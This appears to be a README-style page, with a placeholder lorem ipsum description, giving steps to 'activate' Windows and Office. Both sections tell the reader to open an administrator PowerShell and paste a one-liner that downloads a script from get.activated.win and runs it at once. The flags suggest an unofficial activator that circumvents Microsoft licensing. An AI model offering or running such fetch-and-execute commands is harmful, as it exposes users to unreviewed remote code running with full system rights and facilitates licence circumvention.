<table align="center"><tr></tr><tr><td>
  <img src=".assets/icon.svg" align="center" width="96">
</td></tr></table>

<h1 align="center">WINDOWS</h1>

<table><tr><td align="center" width="99999"><p>
  <a href="https://windows.com">WEBSITE</a>
</p></td></tr></table>

<table><tr><td align="center" width="99999">&nbsp;<p>
  Lorem ipsum dolor sit amet, consectetur adipiscing elit. Ut semper turpis ipsum, at vulputate lacus congue pulvinar. In et convallis nunc, eget tempor orci. Nullam et viverra eros. In scelerisque aenean.
</p>&nbsp;</td></tr></table>

### LEARNING

#### Activate Windows

- Press <kbd>Win</kbd> + <kbd>X</kbd> to reveal menu.
- Click <kbd>Run PowerShell as Administrator</kbd> to pop an elevated shell.
- Copy and paste the following command to activate:
  ```powershell
  & ([ScriptBlock]::Create((Invoke-RestMethod "https://get.activated.win"))) /HWID /S
  ```

#### Activate Office

- Press <kbd>Win</kbd> + <kbd>X</kbd> to reveal menu.
- Click <kbd>Run PowerShell as Administrator</kbd> to pop an elevated shell.
- Copy and paste the following command to activate:
  ```powershell
  & ([ScriptBlock]::Create((Invoke-RestMethod "https://get.activated.win"))) /OHOOK /S
  ```
